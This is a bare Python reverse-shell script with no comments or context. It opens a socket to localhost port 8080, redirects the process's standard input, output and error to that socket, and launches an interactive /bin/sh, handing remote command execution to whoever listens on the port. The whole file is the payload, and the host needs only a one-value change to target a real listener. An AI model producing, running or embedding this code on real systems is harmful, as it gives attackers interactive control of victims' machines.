import os
import socket
import subprocess

IP = "localhost"
PORT = 8080

s = socket.socket()
s.connect((IP, PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
